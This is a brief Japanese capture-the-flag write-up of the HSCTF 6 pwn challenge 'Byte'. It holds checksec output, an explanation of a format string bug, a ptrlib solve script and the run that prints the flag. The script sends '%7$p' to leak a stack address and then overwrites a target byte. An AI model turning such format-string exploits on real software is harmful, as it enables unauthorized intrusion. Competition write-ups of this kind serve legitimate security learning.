# [pwn 425pts] Byte - HSCTF 6
64ビットでいろいろ有効です。
```
$ checksec -f byte
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   84 Symbols     No	0		4	byte
```

メモリ上の2バイト書き換えられますが、FSBがあります。
スタック上の変数を1にできればフラグが手に入るので、1回目でスタックのアドレスをリークして2回目で変数を書き換えます。
```python
from ptrlib import *

#sock = Process("./byte")
sock = Socket("pwn.hsctf.com", 6666)

sock.recvuntil("byte: ")
sock.sendline("%7$p")
addr_stack = int(sock.recvuntil(" "), 16)
addr_target = addr_stack - 314
logger.info("target = " + hex(addr_target))

sock.recvuntil("byte: ")
sock.sendline(hex(addr_target)[2:])

sock.interactive()
```

```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:6666
[+] <module>: target = 0xffa6394a
[ptrlib]$ ffa6394a has been nullified!

that was easy, right? try the next level (bit). here's your flag: hsctf{l0l-opt1mizati0ns_ar3-disabl3d}
```

# 感想
前の問題が似た問題だったのでFSBと気付きにくいかもですね。
